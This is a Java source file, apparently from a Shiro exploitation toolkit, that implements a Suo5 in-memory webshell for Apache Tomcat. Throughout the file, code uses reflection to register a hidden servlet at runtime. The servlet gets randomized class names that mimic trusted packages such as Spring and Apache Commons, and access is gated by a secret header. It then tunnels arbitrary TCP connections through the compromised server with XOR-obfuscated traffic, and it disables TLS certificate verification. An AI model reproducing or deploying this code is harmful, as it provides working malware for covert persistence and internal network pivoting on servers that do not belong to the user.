package com.y5neko.shiroexp.memshell;

import org.apache.catalina.Container;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.ServletRegistration.Dynamic;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.URL;
import java.nio.ByteBuffer;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.KeyManager;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public final class Suo5Servlet extends ClassLoader implements Servlet, Runnable, HostnameVerifier, X509TrustManager {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public String Pwd = "pass";
    public String path = "/suo5servlet";

    // Suo5 特有的认证字段
    public static String headerName;
    public static String headerValue;
    public static HashMap addrs = collectAddr();
    public static HashMap ctx = new HashMap();
    InputStream gInStream;
    OutputStream gOutStream;

    public Suo5Servlet() {
    }

    public Suo5Servlet(ClassLoader c) {
        super(c);
    }

    public Suo5Servlet(InputStream var1, OutputStream var2) {
        this.gInStream = var1;
        this.gOutStream = var2;
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public String getClassName() {
        // 生成随机包名：常见包名 + 8位随机值
        String[] commonPackages = {
            "org.apache.tomcat",
            "org.springframework",
            "com.fasterxml.jackson",
            "org.apache.commons",
            "com.google.common"
        };
        String packagePrefix = commonPackages[(int)(Math.random() * commonPackages.length)];
        String randomSuffix = generateRandomString(8);
        return packagePrefix + ".Suo5Servlet" + randomSuffix;
    }

    private static String generateRandomString(int length) {
        String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt((int)(Math.random() * chars.length())));
        }
        return sb.toString();
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        // 从请求头读取参数
        String pwdFromHeader = this.request.getHeader("p");
        String pathFromHeader = this.request.getHeader("path");
        String headerNameFromHeader = this.request.getHeader("headerName");
        String headerValueFromHeader = this.request.getHeader("headerValue");

        if (pwdFromHeader != null && !pwdFromHeader.isEmpty()) {
            this.Pwd = pwdFromHeader;
        }
        if (pathFromHeader != null && !pathFromHeader.isEmpty()) {
            this.path = pathFromHeader;
        }
        if (headerNameFromHeader != null && !headerNameFromHeader.isEmpty()) {
            headerName = headerNameFromHeader;
        }
        if (headerValueFromHeader != null && !headerValueFromHeader.isEmpty()) {
            headerValue = headerValueFromHeader;
        }

        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            String result = this.addServlet();
            output.append(result);
            // 追加认证信息，格式：Header-Name: xxx | Header-Value: xxx
            output.append(" | Header-Name: " + headerName + " | Header-Value: " + headerValue);
        } catch (Exception var7) {
            output.append("ERROR:// " + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }
    }

    public String addServlet() throws Exception {
        ServletContext servletContext = this.request.getServletContext();
        ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade)servletContext;
        Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
        applicationContextField.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext)applicationContextField.get(applicationContextFacade);
        Field standardContextField = applicationContext.getClass().getDeclaredField("context");
        standardContextField.setAccessible(true);
        StandardContext standardContext = (StandardContext)standardContextField.get(applicationContext);

        String existsMsg = null;
        // 检查是否已存在相同 path 的 Servlet
        Container[] containers = standardContext.findChildren();
        for (Container container : containers) {
            if (container instanceof Wrapper) {
                Wrapper existingWrapper = (Wrapper) container;
                if (existingWrapper.getName().equals(this.path)) {
                    existsMsg = "Servlet already exists, overwriting...";
                    // 删除已存在的 Servlet
                    standardContext.removeChild(existingWrapper);
                    break;
                }
            }
        }

        Wrapper wrapper = standardContext.createWrapper();
        wrapper.setName(this.path);
        standardContext.addChild(wrapper);
        wrapper.setServletClass(this.path);
        wrapper.setServlet(this);
        Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
        registration.addMapping(new String[]{this.path});
        registration.setLoadOnStartup(1);
        if (this.getMethodByClass(wrapper.getClass(), "setServlet", Servlet.class) == null) {
            this.transform(standardContext, this.path);
            this.init((ServletConfig)getFieldValue(wrapper, "facade"));
        }

        // 返回 Success 标记，让工具能够检测是否注入成功
        if (existsMsg != null) {
            return existsMsg + " Success";
        }
        return "Success";
    }

    private void transform(Object standardContext, String path) throws Exception {
        Object containerBase = this.invoke(standardContext, "getParent", (Object[])null);
        Class mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
        Field listenersField = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
        listenersField.setAccessible(true);
        ArrayList listeners = (ArrayList)listenersField.get(containerBase);

        for(int i = 0; i < listeners.size(); ++i) {
            Object mapperListener_Mapper = listeners.get(i);
            if (mapperListener_Mapper != null && mapperListenerClass.isAssignableFrom(mapperListener_Mapper.getClass())) {
                Object mapperListener_Mapper2 = getFieldValue(mapperListener_Mapper, "mapper");
                Object mapperListener_Mapper_hosts = getFieldValue(mapperListener_Mapper2, "hosts");

                for(int j = 0; j < Array.getLength(mapperListener_Mapper_hosts); ++j) {
                    Object mapperListener_Mapper_host = Array.get(mapperListener_Mapper_hosts, j);
                    Object mapperListener_Mapper_hosts_contextList = getFieldValue(mapperListener_Mapper_host, "contextList");
                    Object mapperListener_Mapper_hosts_contextList_contexts = getFieldValue(mapperListener_Mapper_hosts_contextList, "contexts");

                    for(int k = 0; k < Array.getLength(mapperListener_Mapper_hosts_contextList_contexts); ++k) {
                        Object mapperListener_Mapper_hosts_contextList_context = Array.get(mapperListener_Mapper_hosts_contextList_contexts, k);
                        if (standardContext.equals(getFieldValue(mapperListener_Mapper_hosts_contextList_context, "object"))) {
                            new ArrayList();
                            Object standardContext_Mapper = this.invoke(standardContext, "getMapper", (Object[])null);
                            Object standardContext_Mapper_Context = getFieldValue(standardContext_Mapper, "context");
                            Object standardContext_Mapper_Context_exactWrappers = getFieldValue(standardContext_Mapper_Context, "exactWrappers");
                            Object mapperListener_Mapper_hosts_contextList_context_exactWrappers = getFieldValue(mapperListener_Mapper_hosts_contextList_context, "exactWrappers");

                            int l;
                            Object Mapper_Wrapper;
                            Method addWrapperMethod;
                            for(l = 0; l < Array.getLength(mapperListener_Mapper_hosts_contextList_context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(mapperListener_Mapper_hosts_contextList_context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("removeWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path);
                                }
                            }

                            for(l = 0; l < Array.getLength(standardContext_Mapper_Context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(standardContext_Mapper_Context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("addWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class, Object.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path, getFieldValue(Mapper_Wrapper, "object"));
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    private Object invoke(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for(int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object)null);
                    }
                }
            }

            Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[])((Class[])classes.toArray(new Class[0])));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }
    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while(cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field)obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();

            while(cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }

        f.setAccessible(true);
        return f.get(obj);
    }

    // ========== 以下是 Suo5 的核心逻辑 ==========

    public void service(ServletRequest var1, ServletResponse var2) throws ServletException, IOException {
        HttpServletRequest var3 = (HttpServletRequest)var1;
        HttpServletResponse var4 = (HttpServletResponse)var2;

        try {
            String var5 = var3.getContentType();
            if (var3.getHeader(headerName) != null && var3.getHeader(headerName).contains(headerValue) && var5 != null) {
                if (var5.equals("application/plain")) {
                    this.tryFullDuplex(var3, var4);
                    return;
                }

                if (var5.equals("application/octet-stream")) {
                    this.processDataBio(var3, var4);
                } else {
                    this.processDataUnary(var3, var4);
                }
            }
        } catch (Throwable var6) {
        }
    }

    public String getServletInfo() {
        return "";
    }

    public void destroy() {
    }

    public void init(ServletConfig var1) throws ServletException {
    }

    public ServletConfig getServletConfig() {
        return null;
    }

    public void readFull(InputStream var1, byte[] var2) throws IOException, InterruptedException {
        int var5;
        for(int var3 = 0; var3 < var2.length; var3 += var5) {
            int var4 = var2.length - var3;
            var5 = var1.read(var2, var3, var4);
            if (var5 == -1) {
                break;
            }
        }
    }

    public void tryFullDuplex(HttpServletRequest var1, HttpServletResponse var2) throws IOException, InterruptedException {
        ServletInputStream var3 = var1.getInputStream();
        byte[] var4 = new byte[32];
        this.readFull(var3, var4);
        ServletOutputStream var5 = var2.getOutputStream();
        var5.write(var4);
        var5.flush();
    }

    private HashMap newCreate(byte var1) {
        HashMap var2 = new HashMap();
        var2.put("ac", new byte[]{4});
        var2.put("s", new byte[]{var1});
        return var2;
    }

    private HashMap newData(byte[] var1) {
        HashMap var2 = new HashMap();
        var2.put("ac", new byte[]{1});
        var2.put("dt", var1);
        return var2;
    }

    private HashMap newDel() {
        HashMap var1 = new HashMap();
        var1.put("ac", new byte[]{2});
        return var1;
    }

    private HashMap newStatus(byte var1) {
        HashMap var2 = new HashMap();
        var2.put("s", new byte[]{var1});
        return var2;
    }

    byte[] u32toBytes(int var1) {
        byte[] var2 = new byte[]{(byte)(var1 >> 24), (byte)(var1 >> 16), (byte)(var1 >> 8), (byte)var1};
        return var2;
    }

    int bytesToU32(byte[] var1) {
        return (var1[0] & 255) << 24 | (var1[1] & 255) << 16 | (var1[2] & 255) << 8 | (var1[3] & 255) << 0;
    }

    synchronized void put(String var1, Object var2) {
        ctx.put(var1, var2);
    }

    synchronized Object get(String var1) {
        return ctx.get(var1);
    }

    synchronized Object remove(String var1) {
        return ctx.remove(var1);
    }

    byte[] copyOfRange(byte[] var1, int var2, int var3) {
        int var4 = var3 - var2;
        if (var4 < 0) {
            throw new IllegalArgumentException(var2 + " > " + var3);
        } else {
            byte[] var5 = new byte[var4];
            int var6 = Math.min(var1.length - var2, var4);

            for(int var7 = 0; var7 < var6; ++var7) {
                var5[var7] = var1[var2 + var7];
            }

            return var5;
        }
    }

    private byte[] marshal(HashMap var1) throws IOException {
        ByteArrayOutputStream var2 = new ByteArrayOutputStream();
        Object[] var3 = var1.keySet().toArray();

        for(int var4 = 0; var4 < var3.length; ++var4) {
            String var5 = (String)var3[var4];
            byte[] var6 = (byte[])((byte[])var1.get(var5));
            var2.write((byte)var5.length());
            var2.write(var5.getBytes());
            var2.write(this.u32toBytes(var6.length));
            var2.write(var6);
        }

        byte[] var8 = var2.toByteArray();
        ByteBuffer var9 = ByteBuffer.allocate(5 + var8.length);
        var9.putInt(var8.length);
        byte var10 = (byte)((int)(Math.random() * 255.0D + 1.0D));
        var9.put(var10);

        for(int var7 = 0; var7 < var8.length; ++var7) {
            var8[var7] ^= var10;
        }

        var9.put(var8);
        return var9.array();
    }

    private HashMap unmarshal(InputStream var1) throws Exception {
        byte[] var2 = new byte[5];
        this.readFull(var1, var2);
        ByteBuffer var3 = ByteBuffer.wrap(var2);
        int var4 = var3.getInt();
        byte var5 = var3.get();
        if (var4 > 33554432) {
            throw new IOException("invalid len");
        } else {
            byte[] var6 = new byte[var4];
            this.readFull(var1, var6);

            for(int var7 = 0; var7 < var6.length; ++var7) {
                var6[var7] ^= var5;
            }

            HashMap var14 = new HashMap();
            int var9 = 0;

            while(var9 < var6.length - 1) {
                short var10 = (short)var6[var9];
                ++var9;
                if (var9 + var10 >= var6.length) {
                    throw new Exception("key len error");
                }

                if (var10 < 0) {
                    throw new Exception("key len error");
                }

                byte[] var8 = this.copyOfRange(var6, var9, var9 + var10);
                String var11 = new String(var8);
                var9 += var10;
                if (var9 + 4 >= var6.length) {
                    throw new Exception("value len error");
                }

                var8 = this.copyOfRange(var6, var9, var9 + 4);
                int var12 = this.bytesToU32(var8);
                var9 += 4;
                if (var12 < 0) {
                    throw new Exception("value error");
                }

                if (var9 + var12 > var6.length) {
                    throw new Exception("value error");
                }

                byte[] var13 = this.copyOfRange(var6, var9, var9 + var12);
                var9 += var12;
                var14.put(var11, var13);
            }

            return var14;
        }
    }

    private void processDataBio(HttpServletRequest var1, HttpServletResponse var2) throws Exception {
        ServletInputStream var3 = var1.getInputStream();
        HashMap var4 = this.unmarshal(var3);
        byte[] var5 = (byte[])((byte[])var4.get("ac"));
        if (var5.length == 1 && var5[0] == 0) {
            var2.setBufferSize(512);
            ServletOutputStream var6 = var2.getOutputStream();
            var2.setHeader("X-Accel-Buffering", "no");

            Socket var7;
            try {
                String var8 = new String((byte[])((byte[])var4.get("h")));
                int var9 = Integer.parseInt(new String((byte[])((byte[])var4.get("p"))));
                if (var9 == 0) {
                    try {
                        var9 = (Integer)var1.getClass().getMethod("getLocalPort").invoke(var1);
                    } catch (Exception var18) {
                        var9 = (Integer)var1.getClass().getMethod("getServerPort").invoke(var1);
                    }
                }

                var7 = new Socket();
                var7.connect(new InetSocketAddress(var8, var9), 5000);
            } catch (Exception var20) {
                var6.write(this.marshal(this.newStatus((byte)1)));
                var6.flush();
                var6.close();
                return;
            }

            var6.write(this.marshal(this.newStatus((byte)0)));
            var6.flush();
            var2.flushBuffer();
            OutputStream var21 = var7.getOutputStream();
            InputStream var22 = var7.getInputStream();
            Thread var10 = null;

            try {
                Suo5Servlet var11 = new Suo5Servlet(var22, var6);
                var10 = new Thread(var11);
                var10.start();
                this.readReq(var3, var21);
            } catch (Exception var17) {
            } finally {
                var7.close();
                var6.close();
                if (var10 != null) {
                    var10.join();
                }
            }

        } else {
            var2.setStatus(403);
        }
    }

    private void readSocket(InputStream var1, OutputStream var2, boolean var3) throws IOException {
        byte[] var4 = new byte[8192];

        while(true) {
            int var5 = var1.read(var4);
            if (var5 <= 0) {
                return;
            }

            byte[] var6 = this.copyOfRange(var4, 0, 0 + var5);
            if (var3) {
                var6 = this.marshal(this.newData(var6));
            }

            var2.write(var6);
            var2.flush();
        }
    }

    private void readReq(InputStream var1, OutputStream var2) throws Exception {
        while(true) {
            HashMap var3 = this.unmarshal(var1);
            byte[] var4 = (byte[])((byte[])var3.get("ac"));
            if (var4.length != 1) {
                return;
            }

            byte var5 = var4[0];
            if (var5 == 2) {
                var2.close();
                return;
            }

            if (var5 == 1) {
                byte[] var6 = (byte[])((byte[])var3.get("dt"));
                if (var6.length != 0) {
                    var2.write(var6);
                    var2.flush();
                }
            } else if (var5 != 3) {
                return;
            }
        }
    }

    private void processDataUnary(HttpServletRequest var1, HttpServletResponse var2) throws Exception {
        ServletInputStream var3 = var1.getInputStream();
        BufferedInputStream var4 = new BufferedInputStream(var3);
        HashMap var5 = this.unmarshal(var4);
        String var6 = new String((byte[])((byte[])var5.get("id")));
        byte[] var7 = (byte[])((byte[])var5.get("ac"));
        if (var7.length != 1) {
            var2.setStatus(403);
        } else {
            byte var8 = var7[0];
            byte[] var9 = (byte[])((byte[])var5.get("r"));
            boolean var10 = var9 != null && var9.length > 0;
            String var11 = "";
            if (var10) {
                var5.remove("r");
                var11 = new String(var9);
                var10 = !this.isLocalAddr(var11);
            }

            if (var10 && var8 >= 1 && var8 <= 3) {
                HttpURLConnection var28 = this.redirect(var1, var5, var11);
                var28.disconnect();
            } else {
                var2.setBufferSize(512);
                ServletOutputStream var12 = var2.getOutputStream();
                Object var29;
                OutputStream var30;
                if (var8 == 2) {
                    var29 = this.get(var6);
                    if (var29 != null) {
                        var30 = (OutputStream)var29;
                        var30.close();
                    }
                } else if (var8 == 1) {
                    var29 = this.get(var6);
                    if (var29 == null) {
                        var12.write(this.marshal(this.newDel()));
                        var12.flush();
                        var12.close();
                    } else {
                        var30 = (OutputStream)var29;
                        byte[] var31 = (byte[])((byte[])var5.get("dt"));
                        if (var31.length != 0) {
                            var30.write(var31);
                            var30.flush();
                        }

                        var12.close();
                    }
                } else if (var8 == 0) {
                    var2.setHeader("X-Accel-Buffering", "no");
                    String var13 = new String((byte[])((byte[])var5.get("h")));
                    int var14 = Integer.parseInt(new String((byte[])((byte[])var5.get("p"))));
                    if (var14 == 0) {
                        try {
                            var14 = (Integer)var1.getClass().getMethod("getLocalPort").invoke(var1);
                        } catch (Exception var26) {
                            var14 = (Integer)var1.getClass().getMethod("getServerPort").invoke(var1);
                        }
                    }

                    Socket var16 = null;
                    HttpURLConnection var17 = null;
                    InputStream var15;
                    if (var10) {
                        var17 = this.redirect(var1, var5, var11);
                        var15 = var17.getInputStream();
                    } else {
                        try {
                            var16 = new Socket();
                            var16.connect(new InetSocketAddress(var13, var14), 5000);
                            var15 = var16.getInputStream();
                            this.put(var6, var16.getOutputStream());
                            var12.write(this.marshal(this.newStatus((byte)0)));
                            var12.flush();
                            var2.flushBuffer();
                        } catch (Exception var25) {
                            this.remove(var6);
                            var12.write(this.marshal(this.newStatus((byte)1)));
                            var12.flush();
                            var12.close();
                            return;
                        }
                    }

                    try {
                        this.readSocket(var15, var12, !var10);
                    } catch (Exception var24) {
                    } finally {
                        if (var16 != null) {
                            var16.close();
                        }

                        if (var17 != null) {
                            var17.disconnect();
                        }

                        var12.close();
                        this.remove(var6);
                    }
                }
            }
        }
    }

    public void run() {
        try {
            this.readSocket(this.gInStream, this.gOutStream, true);
        } catch (Exception var2) {
        }
    }

    static HashMap collectAddr() {
        HashMap var0 = new HashMap();

        try {
            Enumeration var1 = NetworkInterface.getNetworkInterfaces();

            while(var1.hasMoreElements()) {
                NetworkInterface var2 = (NetworkInterface)var1.nextElement();
                Enumeration var3 = var2.getInetAddresses();

                while(var3.hasMoreElements()) {
                    InetAddress var4 = (InetAddress)var3.nextElement();
                    String var5 = var4.getHostAddress();
                    if (var5 != null) {
                        int var6 = var5.indexOf(37);
                        if (var6 != -1) {
                            var5 = var5.substring(0, var6);
                        }

                        var0.put(var5, Boolean.TRUE);
                    }
                }
            }
        } catch (Exception var7) {
        }

        return var0;
    }

    boolean isLocalAddr(String var1) throws Exception {
        String var2 = (new URL(var1)).getHost();
        return addrs.containsKey(var2);
    }

    HttpURLConnection redirect(HttpServletRequest var1, HashMap var2, String var3) throws Exception {
        String var4 = var1.getMethod();
        URL var5 = new URL(var3);
        HttpURLConnection var6 = (HttpURLConnection)var5.openConnection();
        var6.setRequestMethod(var4);

        try {
            var6.getClass().getMethod("setConnectTimeout", Integer.TYPE).invoke(var6, new Integer(3000));
            var6.getClass().getMethod("setReadTimeout", Integer.TYPE).invoke(var6, new Integer(0));
        } catch (Exception var10) {
        }

        var6.setDoOutput(true);
        var6.setDoInput(true);
        if (HttpsURLConnection.class.isInstance(var6)) {
            ((HttpsURLConnection)var6).setHostnameVerifier(this);
            SSLContext var7 = SSLContext.getInstance("SSL");
            var7.init((KeyManager[])null, new TrustManager[]{this}, (SecureRandom)null);
            ((HttpsURLConnection)var6).setSSLSocketFactory(var7.getSocketFactory());
        }

        byte[] var11 = this.marshal(var2);
        Enumeration var8 = var1.getHeaderNames();

        while(var8.hasMoreElements()) {
            String var9 = (String)var8.nextElement();
            if (var9.equals("Content-Length")) {
                var6.setRequestProperty(var9, String.valueOf(var11.length));
            } else if (var9.equals("Host")) {
                var6.setRequestProperty(var9, var5.getHost());
            } else if (var9.equals("Connection")) {
                var6.setRequestProperty(var9, "close");
            } else if (!var9.equals("Content-Encoding") && !var9.equals("Transfer-Encoding")) {
                var6.setRequestProperty(var9, var1.getHeader(var9));
            }
        }

        OutputStream var12 = var6.getOutputStream();
        var12.write(var11);
        var12.flush();
        var12.close();
        var6.getResponseCode();
        return var6;
    }

    public boolean verify(String var1, SSLSession var2) {
        return true;
    }

    public void checkClientTrusted(X509Certificate[] var1, String var2) throws CertificateException {
    }

    public void checkServerTrusted(X509Certificate[] var1, String var2) throws CertificateException {
    }

    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }
}
